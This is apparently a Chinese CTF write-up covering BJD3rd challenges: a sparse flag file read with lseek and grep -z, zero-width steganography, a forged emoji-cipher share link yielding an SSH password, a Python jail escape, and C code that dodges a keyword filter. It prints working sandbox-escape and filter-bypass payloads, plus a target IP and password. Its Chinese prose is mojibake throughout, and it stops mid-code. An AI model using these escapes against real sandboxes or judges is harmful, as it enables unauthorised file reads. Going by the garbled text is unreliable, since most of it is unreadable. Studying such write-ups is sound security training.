çš„è¾¨åˆ«ç½‘ç»œä¸­çš„æŒä¹…æ€§å¯¹è±¡. python çš„ uuid æ¨¡å—æä¾›UUIDç±»å’Œå‡½æ•°uuid1(), uuid3(), uuid4(), uuid5() æ¥ç”Ÿæˆ1, 3, 4, 5å„ä¸ªç‰ˆæœ¬çš„UUID ( éœ€è¦æ³¨æ„çš„æ˜¯: pythonä¸­æ²¡æœ‰uuid2()è¿™ä¸ªå‡½æ•°). å¯¹uuidæ¨¡å—ä¸­æœ€å¸¸ç”¨çš„å‡ ä¸ªå‡½æ•°æ€»ç»“å¦‚ä¸‹: uuid.uuid1([node[, clock_seq]]) : åŸºäºæ—¶é—´æˆ³ ä½¿ç”¨ä¸»æœºID, åºåˆ—å·, å’Œå½“å‰æ—¶é—´æ¥ç”ŸæˆUUID, å¯ä¿è¯å…¨çƒèŒƒå›´çš„å”¯ä¸€æ€§. ä½†ç”±äºä½¿ç”¨è¯¥æ–¹æ³•ç”Ÿæˆçš„UUIDä¸­åŒ…å«æœ‰ä¸»æœºçš„ç½‘ç»œåœ°å€, å› æ­¤å¯èƒ½å±åŠéšç§. è¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°, å¦‚æœ node å‚æ•°æœªæŒ‡å®š, ç³»ç»Ÿå°†ä¼šè‡ªåŠ¨è°ƒç”¨ getnode() å‡½æ•°æ¥è·å–ä¸»æœºçš„ç¡¬ä»¶åœ°å€. å¦‚æœ clock_seq å‚æ•°æœªæŒ‡å®šç³»ç»Ÿä¼šä½¿ç”¨ä¸€ä¸ªéšæœºäº§ç”Ÿçš„14ä½åºåˆ—å·æ¥ä»£æ›¿. uuid.uuid3(namespace, name) : åŸºäºåå­—çš„MD5æ•£åˆ—å€¼ é€šè¿‡è®¡ç®—å‘½åç©ºé—´å’Œåå­—çš„MD5æ•£åˆ—å€¼æ¥ç”ŸæˆUUID, å¯ä»¥ä¿è¯åŒä¸€å‘½åç©ºé—´ä¸­ä¸åŒåå­—çš„å”¯ä¸€æ€§å’Œä¸åŒå‘½åç©ºé—´çš„å”¯ä¸€æ€§, ä½†åŒä¸€å‘½åç©ºé—´çš„åŒä¸€åå­—ç”Ÿæˆçš„UUIDç›¸åŒ. uuid.uuid4() : åŸºäºéšæœºæ•° é€šè¿‡éšæœºæ•°æ¥ç”ŸæˆUUID. ä½¿ç”¨çš„æ˜¯ä¼ªéšæœºæ•°æœ‰ä¸€å®šçš„é‡å¤æ¦‚ç‡. uuid.uuid5(namespace, name) : åŸºäºåå­—çš„SHA-1æ•£åˆ—å€¼ é€šè¿‡è®¡ç®—å‘½åç©ºé—´å’Œåå­—çš„SHA-1æ•£åˆ—å€¼æ¥ç”ŸæˆUUID, ç®—æ³•ä¸ uuid.uuid3() ç›¸åŒ. ï¼ˆæ¥è‡ªç½‘ç»œï¼‰ çœ‹æ¥æ˜¯åœ¨ 1024*1024*1024*randint(offset,offset+2048) çš„éšæœºä½ç½®å†™å…¥äº†flagã€‚ å†æ¥çœ‹çœ‹ç¡¬ç›˜å¤§å°å’Œæ–‡ä»¶å¤§å°ã€‚ $ df Filesystem 1K-blocks Used Available Use% Mounted on overlay 16197544 2011556 14169604 13% / tmpfs 65536 0 65536 0% /dev tmpfs 507956 0 507956 0% /sys/fs/cgroup /dev/vda1 16197544 2011556 14169604 13% /etc/hosts shm 65536 0 65536 0% /dev/shm tmpfs 507956 0 507956 0% /proc/acpi tmpfs 507956 0 507956 0% /proc/scsi tmpfs 507956 0 507956 0% /sys/firmware $ ls -al total 64 drwxr-x--- 1 root ctf 4096 May 22 06:40 . drwxr-xr-x 1 root root 4096 May 19 03:09 .. -rwxr-x--- 1 root ctf 220 May 5 2019 .bash_logout -rwxr-x--- 1 root ctf 3771 May 5 2019 .bashrc -rwxr-x--- 1 root ctf 807 May 5 2019 .profile -rw-r----- 1 root ctf 16150150774793 May 22 06:40 flag -rw-r----- 1 root ctf 23 May 19 11:05 readme ç¡¬ç›˜è¿™ä¹ˆå°ï¼Œæ€ä¹ˆflagæ–‡ä»¶è¿™ä¹ˆå¤§ï¼ˆ16TB+ ï¼Ÿï¼Ÿï¼Ÿï¼‰ï¼Œä½›äº†ã€‚ è¿™ä¸ª nc æœ‰15sçš„æ—¶é—´é™åˆ¶ï¼Œè¿˜æœ‰æ‰§è¡Œå†…å­˜é™åˆ¶ä¹‹ç±»çš„ã€‚ è¯•äº†ä¸€ä¸‹æ²¡æœ‰stringsï¼Œgrep å‡ºä¸æ¥ flagã€‚ï¼ˆè¢«killäº†ï¼Ÿ è€ƒè™‘åˆ° hint ä¸­æç¤ºå¯ä»¥ç”¨pyæ¥æ•´ã€‚ç¯å¢ƒä¸­åªæœ‰py2. python -c \"open('./flag','r').read()\" è¿™æ ·ä¼šç‚¸å†…å­˜ã€‚ è€ƒè™‘åˆ†å—è¯»å–ï¼Œç„¶è€Œå¥½åƒåˆæœ‰é™åˆ¶ã€‚ä½›äº†ã€‚ 20200605 æ›´æ–°ï¼š çœ‹äº†çœ‹å‡ºé¢˜çš„ TaQini å¸ˆå‚…çš„å‡ºé¢˜ç¬”è®°ï¼Œè¿™é‡Œé¡ºä¾¿å‚è€ƒä¸€ä¸‹ã€‚ ä¹‹æ‰€ä»¥ç”Ÿæˆçš„ flag å¦‚æ­¤ä¹‹å¤§ï¼Œæ˜¯å› ä¸ºç”Ÿæˆçš„è„šæœ¬ä¸­çš„ seek å‡½æ•°åœ¨å°†æ–‡ä»¶åç§»çš„æŒ‡é’ˆå¾€åç§»åŠ¨ä¸€æ®µä¹‹åï¼Œåœ¨å†™å…¥çš„æœ‰æ•ˆæ•°æ®ï¼ˆflagï¼‰ä¹‹é—´ç•™ä¸‹äº†ä¸€ä¸ªä¸ªç”± \\x00 ç»„æˆçš„ç©ºæ´ï¼ˆholeï¼‰ï¼Œè¿™äº› hole æ˜¯ä¸å ç”¨ï¼ˆä¸åˆ†é…ï¼‰ç£ç›˜ç©ºé—´çš„ã€‚å› æ­¤é¢˜ç›®ä¸­ç”¨dfçœ‹ç¡¬ç›˜ç©ºé—´è¿˜æ˜¯å¾ˆå°çš„ã€‚ è€Œç”¨lseekå‡½æ•°èƒ½è·³è¿‡ hole å»è¯»å–æ•°æ®ã€‚ å¯ä»¥ç”¨ man lseek æ¥çœ‹çœ‹å‡½æ•°æ‰‹å†Œã€‚ off_t lseek (int fd, off_t offset, int whence); The lseek() function repositions the offset of the open file associated with the file descriptor fd to the argument offset according to the directive whence. fdï¼šæ–‡ä»¶æè¿°ç¬¦ï¼› offset: ç§»åŠ¨æ–‡ä»¶ä½ç½®çš„åç§»æ•°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ï¼› whence ä¸ºç³»ç»Ÿå®šä¹‰çš„å¸¸é‡ï¼Œå¯èƒ½çš„å€¼æœ‰SEEK_SETã€SEEK_CURã€SEEK_ENDã€SEEK_DATAã€SEEK_HOLEã€‚ SEEK_SET The offset is set to offset bytes. æ–‡ä»¶è¯»å†™ä½ç½®ä»æ–‡ä»¶å¼€å§‹å¾€åç§»åŠ¨offsetä¸ªå­—èŠ‚ã€‚ SEEK_CUR The offset is set to its current location plus offset bytes. æ–‡ä»¶è¯»å†™ä½ç½®ä»å½“å‰ä½ç½®å¼€å§‹ç§»åŠ¨offsetä¸ªå­—èŠ‚ã€‚offsetå¯ä»¥ä¸ºè´Ÿå€¼ã€‚ SEEK_END The offset is set to the size of the file plus offset bytes. æ–‡ä»¶è¯»å†™ä½ç½®ä»æ–‡ä»¶ç»“å°¾ç§»åŠ¨offsetä¸ªå­—èŠ‚ã€‚offsetå¯ä»¥ä¸ºè´Ÿå€¼ã€‚ è¿™é‡Œè¦ç”¨åˆ°çš„æ˜¯ whence å‚æ•°ä¸º SEEK_DATAï¼Œman ä¸­è¿˜å¯¹ç©ºæ´ï¼ˆholeï¼‰çš„åŸç†ä½œäº†è§£é‡Šã€‚ Seeking file data and holes â€‹ Since version 3.1, Linux supports the following additional values for whence: SEEK_DATA Adjust the file offset to the next location in the file greater than or equal to offset containing data. If offset points to data, then the file offset is set to offset. SEEK_HOLE Adjust the file offset to the next hole in the file greater than or equal to offset. If offset points into the middle of a hole, then the file offset is set to offset. If there is no hole past offset, then the file offset is adjusted to the end of the file (i.e., there is an implicit hole at the end of any file). In both of the above cases, lseek() fails if offset points past the end of the file. These operations allow applications to map holes in a sparsely allocated file. This can be useful for applications such as file backup tools, which can save space when creating backups and preserve holes, if they have a mechanism for discovering holes. For the purposes of these operations, a hole is a sequence of zeros that (normally) has not been allocated in the underlying file storage. However, a filesystem is not obliged to report holes, so these operations are not a guaranteed mechanism for mapping the storage space actually allocated to a file. (Furthermore, a sequence of zeros that actually has been written to the underlying storage may not be reported as a hole.) In the simplest implementation, a filesystem can support the operations by making SEEK_HOLE always return the offset of the end of the file, and making SEEK_DATA always return offset (i.e., even if the location referred to by offset is a hole, it can be considered to consist of data that is a sequence of zeros). å¤§æ¦‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™äº›ç©ºæ´æ˜¯é›¶åºåˆ—ï¼Œå®ƒä»¬é€šå¸¸åœ¨åº•å±‚æ–‡ä»¶å­˜å‚¨ä¸­æ²¡æœ‰åˆ†é…ç©ºé—´ã€‚ SEEK_DATA æ˜¯è·³è¿‡ hole å¯»æ‰¾ä¸‹ä¸€ä¸ªæ•°æ®ï¼ŒSEEK_HOLEæ˜¯è·³è¿‡æ•°æ®å¯»æ‰¾ä¸‹ä¸€ä¸ª holeã€‚ åœ¨ python ä¸­çš„ os æ¨¡å—ä¹Ÿæœ‰lseekè¿™ä¸ªå‡½æ•°ï¼Œäºæ˜¯å¯ä»¥ç”¨æ¥å†™expäº†ã€‚ è€ƒè™‘åˆ°æ²¡æœ‰ç¯å¢ƒäº†ï¼Œè¿™é‡Œåˆ©ç”¨/f1a9.bakä¸­çš„å†…å®¹åœ¨æœ¬åœ°ç”Ÿæˆäº†ä¸€ä¸ª flagï¼Œè€Œåå‚ç…§ TaQini å¸ˆå‚…çš„è„šæœ¬æ¥è¯»å– flagã€‚ é¦–å…ˆçœ‹ä¸€ä¸‹ flag æœ‰å¤šå¤§ã€‚ # ls -al total 56 drwxr-xr-x 2 root root 4096 6æœˆ 5 22:06 ./ drwxr-xr-x 8 root root 4096 6æœˆ 5 21:48 ../ -rw-r--r-- 1 root root 15007689474057 6æœˆ 5 21:48 flag åœ¨å‘½ä»¤è¡Œå¯ä»¥ç”¨ python -c &lt;command&gt; æ¥æ‰§è¡Œ py è¯­å¥ï¼Œå¤šè¡Œçš„è¯ç”¨ä¸‰ä¸ªå¼•å·å¼•èµ·æ¥å°±å®Œäº‹äº†ï¼ˆæˆ‘ä¹Ÿæ‰çŸ¥é“å‘½ä»¤è¡Œä¹Ÿå¯ä»¥è¿™æ ·å¤šè¡Œçš„å˜¤å˜¤å˜¤ï¼‰ã€‚ Expï¼šï¼ˆåœ¨å‘½ä»¤è¡Œæ‰§è¡Œï¼‰ python -c \"\"\" import os fd = os.open('/home/ctf/flag',0) off = 0 flag = '' while off &lt; 15007689474057: off = os.lseek(fd,off,3) # SEEK_DATA off += 1 a = os.read(fd,1) if a != '\\x00': flag += a print flag \"\"\" å³å¯å¾—åˆ°flagäº†ï¼ è¿™é‡Œè¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œé‚£å°±æ˜¯åˆ©ç”¨ grep å¤§æ³•ï¼ çœ‹åˆ°æœ‰å¸ˆå‚…è¯´ï¼Œç”¨ grep -z å¯ä»¥å•è¡Œè¯­å¥å‡º flagï¼Œä¸è¿‡æ²¡æœ‰å…·ä½“ç»™å‡ºå¦‚ä½•å®ç°ï¼Œäºæ˜¯å°±è‡ªå·±è¯•äº†ä¸€ä¸‹ã€‚ çœ‹äº†çœ‹ grep --help å’Œ man grepï¼š -z, â€“null-data ä¸€ä¸ª 0 å­—èŠ‚çš„æ•°æ®è¡Œï¼Œä½†ä¸æ˜¯ç©ºè¡Œ -z, â€“null-data Treat the input as a set of lines, each terminated by a zero byte (the ASCII NUL character) instead of a newline. Like the -Z or â€“null option, this option can be used with commands like sort -z to process arbitrary file names. -zå°±æ˜¯è¯´æŠŠé›¶å­—ç¬¦çœ‹æˆæ˜¯è¾“å…¥çš„åˆ†è¡Œæ ‡å¿—ï¼Œå¯ä»¥ç†è§£æ˜¯æŠŠ \\x00 å½“æˆåˆ†è¡Œç¬¦ï¼Œæ­£å¥½å°±ç¬¦åˆè¿™é¢˜çš„æ„æ€äº†ï¼Œå¦™å‘€ï¼ è¯•äº†ä¸€é˜µå­ï¼Œå‘ç°å¯ä»¥è¿™æ ·æ¥è¯»å– flag æ–‡ä»¶ï¼š grep -z \".\\+\" flag # Or grep -z \".\" flag æƒ³ä¸åˆ°å§ï¼Œgrep è¿˜èƒ½è¿™ä¹ˆç”¨å‘¢ã€‚ babyweb flagæ ¼å¼ï¼šæŠŠBJD{this_is_flag}è½¬md5ï¼Œæäº¤md5å€¼(å°å†™) hint: ç¬¬ä¸‰ç»„å¯†ç ä¸­çš„æŸä¸€ä½ï¼Œä»¥ä¸‹å›¾çš„è§£å¯†ç»“æœä¸ºå‡†ï¼š ç™¾åº¦å›¾ç‰‡æœå‡ºæ¥çš„å¯†ç è¡¨æ˜¯Qï¼Œä»¥åŸè‘—ä¸ºå‡† æ”¹æˆwï¼Œå†æ ¹æ®å›¾ç‰‡çš„æç¤ºæ”¹æˆWï¼›å¦‚æœè¿˜æäº¤å¤±è´¥å°±æ˜¯å…¶ä»–ä½æœ‰è§£é”™çš„ã€‚ æœ‰ä¸ªflag.zipï¼Œé‡Œé¢æœ‰ä¸ªå›¾ç‰‡å¯†ç åŠ å¯†äº†ã€‚ è¿™é¢˜ç½‘é¡µä¸Šçœ‹åˆ°é‚£ä¸ª pass å’Œ word_is_here ä¹‹é—´çš„ç©ºå­—ç¬¦è¿˜è§‰å¾—å¥‡æ€ªï¼Œåšé¢˜çš„æ—¶å€™å°±æ²¡æƒ³åˆ°æ˜¯é›¶å®½åº¦å­—ç¬¦éšå†™ï¼ˆZero-Width Space Steganographyï¼‰â€¦â€¦åŸæ¥è¿˜æœ‰ç”¨åˆ°ç½‘é¡µä¸Šçš„ã€‚ è§£å¯†ç½‘ç«™å‚è€ƒï¼š http://zero.rovelast.com/ https://offdev.net/demos/zwsp-steg-js GitHub ä»“åº“å‚è€ƒï¼š zwsp-steg-py ï¼ˆåŸºäº python å®ç°ï¼‰ zwsp-steg-js ï¼ˆåŸºäº JavaScript å®ç°ï¼‰ è§£å‡ºæ¥å¯†ç æ˜¯zerowidthcharactersinvisibleã€‚ æ‹¿å»è§£å‹å›¾ç‰‡ï¼Œå‘ç°æ–‡ä»¶å€’åºäº†ã€‚ ï¼ˆç•™å‘ï¼Œåé¢æ¥ç€å¤ç°ï¼‰ manual è¯·ä½¿ç”¨sshè¿æ¥é¶æœºï¼ˆç”¨æˆ·åä¸ºctfï¼Œå¯†ç è¯¦è§æ¬¢è¿ä¿¡æ¯ï¼‰â€”â€”â€”â€” æ­¡è¿ä½¿ç”¨BJD3rdå¸®åŠ©æ‰‹å†Œâ€”â€”â€”â€”ã€Œmanualä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“ã€ 183.129.189.60:10125,10126,10127,10128,10129,10130 hint0 è¯•è¯•limuxçš„manå‘½ä»¤ï¼Œçœ‹çœ‹ä¸æœ¬é¢˜çš„manæ–‡æ¡£æœ‰ä½•ä¸åŒ hint0.5 å…³äºç™»å½•å¯†ç ï¼Œè¯•è¯•emojiç½‘ç«™çš„åˆ†äº«åŠŸèƒ½ hint1 æœ¬é¢˜æ— éœ€ææƒï¼Œè¯·ä»”ç»†çœ‹çœ‹æ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶ hint2 æ®è¯´ä¼špsçš„å¸ˆå‚…éƒ½åšå‡ºæ¥äº† hint3 f1a9.pyçš„ç‹¬ç™½ï¼šæˆ‘çš„çœŸå®èº«ä»½æ˜¯web server è¿™é¢˜æœ‰æ¯’ï¼Œåšäº†ä¸€å¤©æ²¡åšå‡ºæ¥â€¦â€¦å¤§æ¦‚å†™å†™å§ã€‚ % ssh ctf@183.129.189.60 -p 10128 Welcome to BJD3rd Games ~ ğŸ€ğŸ¾ğŸŒ´ğŸšœğŸ‹ğŸŠğŸ‡ğŸ‚ğŸ“ğŸ‘ğŸˆğŸŸğŸ’ğŸšŸğŸ— The above login passwd is encrypted. leads: - http://emoji.taqini.space - suika Try to figure out where is your # ##### ##### ###### ## ## # # # # # # # # # # # # ##### # # # ###### ### # # ###### # # # # # # # # # ##### # # ##### # p.s. Maybe you have lots of xiaowenhao after login, I will help u look up the manual pages of flag. Now, input passwd to start the game: http://emoji.taqini.space æ˜¯ TaQini å¸ˆå‚…éƒ¨ç½²çš„ codemoji åŠ è§£å¯†ç½‘ç«™ã€‚ suikaåœ¨æ—¥è¯­ä¸­æ˜¯ è¥¿ç“œ çš„æ„æ€ï¼Œçœ‹æ¥è¿™å°±æ˜¯ key äº†ã€‚ éšæ„è¯•ç€åŠ å¯†äº†ä¸€ä¸ªï¼Œåœ¨åˆ†äº«ç•Œé¢æµè§ˆå™¨æŠ“åŒ…å¾—åˆ°åˆ†äº«é“¾æ¥å½¢å¼ä¸º http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J%2BNi%2FCfjonwn4y38J%2BOkfCfjYvwn46J8J%2BMt%2FCfjpHwn42L8J%2BOifCfjLfwn46RIiwia2V5Ijoi8J%2BNiSJ9 data å‚æ•° urldecode + base64 è§£ç åå¾—åˆ° {\"message\":\"ğŸ‹ğŸ‰ğŸŒ·ğŸ‘ğŸ‹ğŸ‰ğŸŒ·ğŸ‘ğŸ‹ğŸ‰ğŸŒ·ğŸ‘\",\"key\":\"ğŸ‰\"} äºæ˜¯æƒ³åˆ°ä¿®æ”¹messageå‚æ•°æ„é€  payload å¦‚ä¸‹ã€‚ {\"message\":\"ğŸ€ğŸ¾ğŸŒ´ğŸšœğŸ‹ğŸŠğŸ‡ğŸ‚ğŸ“ğŸ‘ğŸˆğŸŸğŸ’ğŸšŸğŸ—\",\"key\":\"ğŸ‰\"} base64 encode + urlencode: eyJtZXNzYWdlIjoi8J%2BQgPCfkL7wn4y08J%2BanPCfjYvwn5CK8J%2BNh%2FCfkILwn42T8J%2BOkfCfkIjwn5Cf8J%2BSgfCfmp%2Fwn42XIiwia2V5Ijoi8J%2BNiSJ9 æ„é€ åˆ†äº«é“¾æ¥å¾—åˆ°ï¼š http://taqini.space/codemoji/share.html?data=eyJtZXNzYWdlIjoi8J%2BQgPCfkL7wn4y08J%2BanPCfjYvwn5CK8J%2BNh%2FCfkILwn42T8J%2BOkfCfkIjwn5Cf8J%2BSgfCfmp%2Fwn42XIiwia2V5Ijoi8J%2BNiSJ9 æ‹¿å»è§£ç ã€‚ å¾—åˆ°sshè¿æ¥å¯†ç ï¼š C0dEmOj!so4UnNy è¿˜åˆ«è¯´ï¼ŒæŒºå¥½çœ‹çš„233. çœ‹äº† Help æ‰å‘ç°è¿™æ˜¯ w3mã€‚è¿˜å¸¦å³é”®èœå•çš„å“‡ï¼ w3mæ˜¯ä¸ªå¼€æ”¾æºä»£ç çš„æ–‡å­—å¼ç½‘é¡µæµè§ˆå™¨ã€‚ w3mæ”¯æŒè¡¨æ ¼ã€æ¡†æ¶ã€SSLè¿çº¿ã€é¢œè‰²ã€‚å¦‚æœæ˜¯åœ¨é€‚å½“çš„terminalä¸Šï¼Œç”šè‡³è¿˜æ”¯æŒâ€œinline imageâ€ã€‚ è¿™ä¸ªè½¯ä»¶é€šå¸¸å°½é‡å‘ˆç°å‡ºç½‘é¡µæœ¬æ¥çš„ç¼–æ’ã€‚ â€œw3mâ€è¿™åå­—æ˜¯æ¥è‡ªâ€œWWW-wo-Miruâ€ï¼Œå°±æ˜¯æ—¥æ–‡çš„â€œçœ‹WWWâ€ä¹‹ä¹‰ã€‚ å“‡æ˜¯çœŸçš„æµè§ˆå™¨å”‰ï¼Œè¿˜å¯ä»¥ä¸Šæˆ‘åšå®¢ï¼ˆé›¾ï¼‰ï¼Œè™½ç„¶è§£æä¸äº†ä¸­æ–‡å˜¤å˜¤å˜¤ã€‚ å€ŸåŠ©å¿«æ·é”®Uåˆ†åˆ«è®¿é—®givemeflagå’Œ getflagã€‚ HISTORY é‡Œç»™äº†ä¸ªç½‘å€ https://www.jianshu.com/p/ac26b4506a38 è®²çš„æ˜¯è‡ªå®šä¹‰manæ‰‹å†Œã€‚ æŸ¥çœ‹/etc/manpath.configæ–‡ä»¶ã€‚ å¯¹æ¯”ä¸€ä¸‹å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼ˆï¼Ÿï¼Ÿï¼Ÿ ç”¨ V å¯ä»¥æŸ¥çœ‹æ–‡ä»¶ï¼Œä½†æ˜¯æ‰¾ä¸åˆ° f1a9.pyï¼Ÿ Option é‡Œå¯ä»¥æ”¹é…ç½®ç”¨å¤–éƒ¨æµè§ˆå™¨æ‰“å¼€ï¼Œè€ƒè™‘æ˜¯åå¼¹ shellã€‚ ï¼ˆä¸è¿‡ä¹ˆæœ‰ curlï¼Œä¸ä¼šäº†â€¦â€¦å˜¤å˜¤å˜¤ ï¼ˆçœ‹å¤§ä½¬ä»¬æ˜¯ç”¨ perl æ•´çš„ã€‚ è¿™é¢˜åé¢è¿˜æœ‰å¥½å‡ æ­¥â€¦â€¦æœ‰ç©ºå†å¤ç°8. æœ€åæ˜¯ä¸€ä¸ª http://999.taqini.space å¤ªæï¼Ÿä¼šç©ã€‚ PY me è¯·æäº¤md5(â€œBJD{xxxx}â€)ï¼› ä½¿ç”¨ncè¿æ¥ï¼› å°½é‡ç”¨åé¢çš„ç«¯å£ï¼Œ10020ç«¯å£ä¸å¤ªç¨³å®š 183.129.189.60:10020,10021,10022,10023,10024,10026 flagæ ¼å¼ä¸ºmd5ï¼ˆBJD{.*}ï¼‰ä¸Šäº¤md5å€¼ ä½¿ç”¨ncè¿æ¥é¶æœºï¼Œå»ºè®®ç”¨åé¢ç«¯å£å· hint1: æ‰€æœ‰æ²¡æœ‰ä½¿ç”¨hint()ä¸­ç»™å‡ºçš„å‡½æ•°åšå‡ºé¢˜ç›®çš„æ–¹æ³•éƒ½æ˜¯éé¢„æœŸï¼Œå¦‚æœæ‚¨æ˜¯éé¢„æœŸè¯·æŠ¥å‘Šæˆ‘ä»¬ï¼Œæ‰€ä»¥ ä»å“ªé‡Œå…¥æ‰‹åº”è¯¥æ‡‚äº†å§ï¼Ÿ hint2: if( #s#o#m#e#t#h#i#n#g##I##w#o#n#t##t#e#l#l##y#o#u# ) è¿™è¿‡æ»¤äº†å…¨éƒ¨å­—æ¯å’Œæ•°å­—ï¼Œå½“ç„¶è¿˜è¿‡æ»¤äº†å…¶ä»–ç¬¦å·ï¼Œéœ€è¦è‡ªå·±fuzzï¼ˆsocket pwntoolç­‰) hint3: pythonå‡ ï¼Ÿ æ‰“é”™å­—äº†ï¼Œæ˜¯resultï¼Œä¸å½±å“åšé¢˜ é¢˜ç›®ç»™äº† hint è¯´è¿‡æ»¤äº†å…¨éƒ¨å­—æ¯å’Œæ•°å­—ï¼Œå½“ç„¶è¿˜è¿‡æ»¤äº†å…¶ä»–ç¬¦å·ã€‚ è¯•äº†å‘ç°ä¸ä»…ä»…å¦‚æ­¤ï¼Œå¸¸ç”¨çš„ä¸€ä¸‹å‡½æ•°ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ¯”å¦‚ osï¼Œsysï¼Œopenï¼Œlambdaï¼Œsystemï¼Œexecï¼Œevalï¼Œbuiltinsç­‰ç­‰ã€‚ å‡½æ•°åç§°ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å¯ä»¥ç»•è¿‡ï¼Œä½†ä¸çŸ¥é“ç”¨ä»€ä¹ˆæ–¹æ³•èƒ½ç»•è¿‡æ¥è°ƒç”¨å‡½æ•°äº†ã€‚ çœ‹äº†ä¸‹ dir()ï¼Œå¤§æ¦‚æœ‰è¿™å‡ ä¸ª False, __builtins__ , hint, rceMeã€‚ é¢˜ç›®ä¸­çš„ if Falseï¼Œç›´æ¥ä»¤ False=True å°±è¡Œï¼Œæ¯•ç«Ÿ python é‡Œéƒ½æ˜¯å¯¹è±¡ object 2333. æœ¬æ¥æƒ³æ”¹ str çš„ï¼Œä½†æ€ä¹ˆæ ·éƒ½ç»•ä¸è¿‡ if( #s#o#m#e#t#h#i#n#g#_#I#_#w#o#n#t#_#t#e#l#l#_#y#o#u# ) è¿™éƒ¨åˆ†åˆ¤æ–­ã€‚ åˆ©ç”¨æŠ¥é”™çŸ¥é“äº†æºç æ–‡ä»¶åç§°ä¸º bjdpyjail.pyï¼Œä¸è¿‡å¥½åƒæ²¡å•¥ç”¨ã€‚ è€ƒè™‘ç”¨å­—ç¬¦æ¥ç»•è¿‡ï¼Œæ‰‹åŠ¨è¯•éªŒå‘ç°åŒ…æ‹¬ä½†ä¸é™äº ^.; è¢«è¿‡æ»¤äº†ã€‚ è¯´åˆ°è¿™éš¾å—æ­»äº†ï¼Œæœ‰ç©ºå¾—å­¦å­¦ pwntoolsï¼Œç›´æ¥æ§åˆ¶å°æ‰‹ç ä»£ç å¤ªjréš¾å—äº†ï¼Œè¿˜ä¸èƒ½å¿«æ·è°ƒç”¨ä¸Šä¸€æ¡æ‰§è¡Œå‘½ä»¤ï¼Œæ— æ³•æ¥å—ã€‚ è¿™ä¹ˆè¯´æ¥ï¼Œå¼‚æˆ– ^ ä¸è¡Œï¼Œä½†å–å ~ å¯ä»¥ï¼Œ&lt; &gt;ä¹Ÿå¯ã€‚ æŸ¥äº†ä¸€ä¸‹ç½‘ä¸Šæœ‰å…³äº PHP çš„å­—ç¬¦ç»•è¿‡ï¼Œç„¶è€Œåœ¨ python é‡Œä¸èƒ½ç›´æ¥å¯¹å­—ç¬¦æœ¬èº«å–åï¼Œè¦å…ˆå–ordï¼Œç„¶åæƒ³äº†åŠå¤©éƒ½æƒ³ä¸åˆ°è¯¥æ€ä¹ˆç»•äº†â€¦â€¦ ï¼ˆæ‘Šæ‰‹ï¼Œç­‰å¤ç° èµ›åçœ‹åˆ°å¤§ä½¬æ‰¾åˆ°äº†å¥‡å¦™çš„ç»•è¿‡æ–¹æ³•ï¼ŒæŠŠæºç è¯»å–å‡ºæ¥äº†ã€‚ï¼ˆè¯¦è§ è¿™é‡Œ ï¼‰ vars(locals()['_'+'_buil'+'tins_'+'_'])[\"op\"+\"en\"]('bjdpyjail.py', 'r').read() é¢„æœŸè§£è¯¦è§å‡ºé¢˜å¸ˆå‚… Y1ng å¸ˆå‚…çš„è¿™ä¸€ç¯‡ï¼š [è¯‘]PlaidCTFä¸­ä¸€é“PyJailé€ƒé€¸é¢˜ç›®åˆ†æ PwnTaQiniOJ-0 æ¬¢è¿æ¥åˆ°TaQiniçš„Cè¯­è¨€æ–°æ‰‹è®­ç»ƒè¥ ï¼ˆæ²¡æœ‰é™„ä»¶ï¼Œç›²æ‰“ï¼‰ 183.129.189.60:10075,10076,10077,10078,10079,10080 è¿™é‡Œå‘Šè¯‰äº†flagæ‰€åœ¨ç›®å½•ä¸º /home/ctf/flagã€‚ å¥½ä¹…æ²¡å†™Cäº†ï¼Œçªç„¶éƒ½å¿˜è®°æ–‡ä»¶æ“ä½œäº†ã€‚è¢« python çš„openæƒ¯åäº†å”‰ã€‚ è¯•äº†ä¸€ä¸‹ï¼Œè¿˜æœ‰ defender å”‰ã€‚flagè¢«è¿‡æ»¤äº†ã€‚ #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(){ FILE *fp; char name[20]=\"/home/ctf/fl\"; char tmp[1000]={0}; printf(\"Hello TaQini\"); strcat(name,\"ag\"); printf(\"%s\\n\", name); fp=fopen(name,\"r\"); fscanf(fp, \"%s\", tmp); printf(\"%s\", tmp); fclose(fp); return 0; } @ å‘ç°å¥½åƒæ•æ„Ÿè¯ä¸ä»…ä»…æ˜¯flagï¼Œè¿˜æœ‰homeå•¥çš„â€¦â€¦ç„¶è€Œèµ›åæ‰å‘ç°ï¼Œæ°”æ­»æˆ‘äº†ã€‚ å¯ä»¥sprintfæ¥æ‹¼æ¥å­—ç¬¦ä¸²ã€‚ ï¼ˆæƒ³èµ·æ¥æŸæ¬¡åšé¡¹ç›®ç»™å•ç‰‡æœºç¼–ç¨‹å°±é è¿™ç©æ„æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œè¢« python æƒ¯åçš„æˆ‘å†™çš„éš¾å—æ­»äº†ã€‚ sprintf(&amp;name, \"%s%s%s%s%s\", \"/hom\", \"e\",\"/ct\", \"f/f\", \"lag\"); å½“ç„¶è¿˜å¯ä»¥ç›´æ¥ç”¨å­—ç¬¦æ•°ç»„èµ‹å€¼çš„æ–¹æ³•ã€‚ char name[15] = { '/','h','o','m','e','/','c','t','f','/','f','l','a','g','\\0' }; èµ›åç¾¤é‡Œæœ‰å¤§ä½¬ç»™å‡ºäº†å¦‚ä¸‹çš„éé¢„æœŸè§£ï¼Œå¤ªä½©æœäº†ï¼ #include \"/home/ctf/fl\\\\ ag\" å“‡å‘œï¼Œç”¨æŠ¥é”™æ¥å¼¹flagï¼è™½ç„¶ä¹‹å‰å†™é”™è¯­æ³•ä¹ŸæŠ¥é”™äº†ï¼Œä½†è¿™è„‘æ´çœŸæ²¡æƒ³åˆ°ã€‚æœç„¶æ˜¯ OJ å¤§ä½¬ã€‚ åŒæ ·æ¼æ´å¯ç”¨äºå¦ä¸€ä¸ª OJ é¢˜ã€‚ Cryptobbcrypto# -*- coding:utf-8 -*- import A,SALT from itertools import * def encrypt(m, a, si): c=\"\" for i in range(len(m)): 